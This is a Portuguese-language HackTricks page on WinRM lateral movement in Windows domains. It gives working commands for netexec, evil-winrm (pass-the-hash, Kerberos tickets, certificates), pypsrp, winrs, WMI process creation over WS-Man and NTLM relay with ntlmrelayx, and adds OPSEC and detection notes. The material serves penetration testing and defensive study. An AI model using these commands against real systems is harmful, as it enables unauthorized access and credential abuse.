# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM é um dos transports de **lateral movement** mais convenientes em ambientes Windows porque oferece um shell remoto sobre **WS-Man/HTTP(S)** sem precisar de truques de criação de serviço SMB. Se o alvo expõe **5985/5986** e seu principal está autorizado a usar remoting, muitas vezes você consegue sair de "valid creds" para "interactive shell" muito rapidamente.

Para a **enumeração de protocolo/serviço**, listeners, habilitar WinRM, `Invoke-Command` e uso genérico do client, veja:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Por que operadores gostam de WinRM

- Usa **HTTP/HTTPS** em vez de SMB/RPC, então muitas vezes funciona onde execução no estilo PsExec é bloqueada.
- Com **Kerberos**, evita enviar credentials reutilizáveis ao alvo.
- Funciona bem a partir de tooling em **Windows**, **Linux** e **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- O caminho interativo de PowerShell remoting inicia **`wsmprovhost.exe`** no alvo sob o contexto do usuário autenticado, o que é operacionalmente diferente de execução baseada em service.

## Modelo de acesso e pré-requisitos

Na prática, o sucesso do WinRM lateral movement depende de **três** coisas:

1. O alvo tem um **WinRM listener** (`5985`/`5986`) e regras de firewall que permitem acesso.
2. A conta consegue **autenticar** no endpoint.
3. A conta tem permissão para **abrir uma remoting session**.

Formas comuns de obter esse acesso:

- **Local Administrator** no alvo.
- Associação ao grupo **Remote Management Users** em sistemas mais novos ou **WinRMRemoteWMIUsers__** em sistemas/componentes que ainda respeitam esse grupo.
- Direitos de remoting explicitamente delegados via descritores de segurança locais / alterações de ACL do PowerShell remoting.

Se você já controla uma máquina com privilégios de admin, lembre-se de que também é possível **delegar acesso via WinRM sem associação completa ao grupo de admin** usando as técnicas descritas aqui:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Pegadinhas de autenticação que importam durante lateral movement

- **Kerberos exige hostname/FQDN**. Se você conectar por IP, o client normalmente cai para **NTLM/Negotiate**.
- Em casos de **workgroup** ou de trust cross-trust, NTLM normalmente exige **HTTPS** ou que o alvo seja adicionado a **TrustedHosts** no client.
- Com **local accounts** via Negotiate em um workgroup, restrições de UAC remote podem impedir acesso, a menos que a conta Administrador embutida seja usada ou `LocalAccountTokenFilterPolicy=1`.
- O PowerShell remoting usa por padrão o SPN **`HTTP/<host>`**. Em ambientes onde **`HTTP/<host>`** já está registrado para outra service account, o Kerberos do WinRM pode falhar com `0x80090322`; use um SPN qualificado por porta ou troque para **`WSMAN/<host>`** onde esse SPN existir.

Se você obtiver credentials válidas durante password spraying, validá-las via WinRM muitas vezes é a forma mais rápida de verificar se elas viram um shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement de Linux para Windows

### NetExec / CrackMapExec para validação e execução em um único passo
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM para shells interativos

`evil-winrm` continua sendo a opção interativa mais conveniente a partir do Linux porque suporta **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, transferência de arquivos e carregamento de PowerShell/.NET em memória.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Caso especial de Kerberos SPN: `HTTP` vs `WSMAN`

Quando o SPN padrão **`HTTP/<host>`** causa falhas no Kerberos, tente solicitar/usando um ticket **`WSMAN/<host>`** em vez disso. Isso aparece em configurações empresariais endurecidas ou incomuns, onde `HTTP/<host>` já está associado a outra conta de serviço.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Isso também é útil depois de abuso de **RBCD / S4U** quando você forjou ou solicitou especificamente um ticket de serviço **WSMAN** em vez de um ticket genérico `HTTP`.

### Certificate-based authentication

WinRM também suporta **client certificate authentication**, mas o certificado precisa estar mapeado no alvo para uma **local account**. Do ponto de vista ofensivo, isso importa quando:

- você já roubou/exportou um certificado de cliente válido e a private key já mapeados para WinRM;
- você abusou de **AD CS / Pass-the-Certificate** para obter um certificado para um principal e então pivotar para outro caminho de autenticação;
- você está operando em ambientes que evitam deliberadamente remoting baseado em senha.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM é muito menos comum do que autenticação por password/hash/Kerberos, mas quando existe pode fornecer um caminho de **lateral movement sem password** que sobrevive à rotação de password.

### Python / automation com `pypsrp`

Se você precisar de automation em vez de uma operator shell, `pypsrp` fornece WinRM/PSRP a partir de Python com suporte a **NTLM**, **certificate auth**, **Kerberos** e **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Movimento lateral WinRM nativo do Windows

### `winrs.exe`

`winrs.exe` vem integrado e é útil quando você quer **execução de comandos WinRM nativa** sem abrir uma sessão interativa de remoting do PowerShell:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operacionalmente, `winrs.exe` geralmente resulta em uma cadeia de processo remoto semelhante a:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Isto vale a pena lembrar porque difere de exec baseada em service e de sessões interativas PSRP.

### `winrm.cmd` / WS-Man COM em vez de PowerShell remoting

Você também pode executar através do **WinRM transport** sem `Enter-PSSession`, invocando classes WMI via WS-Man. Isso mantém o transport como WinRM enquanto o primitive de execução remota se torna **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Essa abordagem é útil quando:

- O logging do PowerShell é fortemente monitorado.
- Você quer **WinRM transport** mas não um fluxo clássico de PS remoting.
- Você está criando ou usando ferramentas personalizadas em torno do objeto COM **`WSMan.Automation`**.

## NTLM relay para WinRM (WS-Man)

Quando o relay de SMB é bloqueado por signing e o relay de LDAP é restrito, **WS-Man/WinRM** ainda pode ser um alvo de relay atraente. O `ntlmrelayx.py` moderno inclui **WinRM relay servers** e pode fazer relay para alvos **`wsman://`** ou **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Duas notas práticas:

- Relay é mais útil quando o alvo aceita **NTLM** e o principal relayed tem permissão para usar WinRM.
- O código recente do Impacket trata especificamente requests **`WSMANIDENTIFY: unauthenticated`**, então probes no estilo `Test-WSMan` não quebram o fluxo do relay.

Para restrições de multi-hop depois de obter uma primeira sessão WinRM, consulte:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Notas de OPSEC e detecção

- **PowerShell remoting** interativo normalmente cria **`wsmprovhost.exe`** no alvo.
- **`winrs.exe`** geralmente cria **`winrshost.exe`** e depois o processo filho solicitado.
- Espere telemetria de **network logon**, eventos do serviço WinRM e logging operacional/script-block do PowerShell se você usar PSRP em vez de `cmd.exe` bruto.
- Se você precisar apenas de um único comando, `winrs.exe` ou execução WinRM one-shot pode ser mais discreta do que uma sessão interativa de remoting de longa duração.
- Se Kerberos estiver disponível, prefira **FQDN + Kerberos** em vez de IP + NTLM para reduzir tanto problemas de trust quanto mudanças incômodas em `TrustedHosts` no lado do cliente.

## Referências

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
